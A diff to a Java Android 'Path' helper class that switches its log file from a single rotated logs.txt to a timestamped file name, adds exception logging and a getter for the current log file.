@@ -17,6 +17,8 @@ import android.os.StatFs;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
+import com.android.service.util.DateTime;
+import com.android.service.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -36,7 +38,9 @@ public class Path {
 	/** The Constant LOG_DIR. */
 	private static String LOG_DIR; //$NON-NLS-1$
 
-	public static final String LOG_FILE = "logs.txt"; //$NON-NLS-1$
+	private static String curLogFile;
+
+	public static final String LOG_FILE = "logs"; //$NON-NLS-1$
 
 	/** The hidden. */
 	private static String hidden;
@@ -46,6 +50,7 @@ public class Path {
 	// public static final String UPLOAD_DIR = "";
 
 	private Path() {
+
 	}
 
 	/**
@@ -78,25 +83,23 @@ public class Path {
 
 		try {
 			if (haveStorage()) {
-
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 				}
-				boolean success=true;
-				
-				success&=createDirectory(conf());
-				success&=createDirectory(markup());
-				success&=createDirectory(logs());
+
+				boolean success = true;
+
+				success &= createDirectory(conf());
+				success &= createDirectory(markup());
+				success &= createDirectory(logs());
 
 				if (Cfg.FILE) {
-					final File file = new File(logs(), LOG_FILE);
-					final File bak = new File(logs(), LOG_FILE + ".bak");
-					if(bak.exists()){
-						bak.delete();
-					}
-					if (file.exists()) {						
-						file.renameTo(bak);
-					}
+					DateTime dt = new DateTime();
+
+					curLogFile = LOG_FILE + "-" + dt.getOrderedString() + ".txt";
+
+					final File file = new File(logs(), curLogFile);
+
 					file.createNewFile();
 				}
 
@@ -104,11 +107,20 @@ public class Path {
 				return success;
 			}
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
+
 		return false;
+	}
+
+	public static String getCurLogfile() {
+		return curLogFile;
 	}
 
 	/**
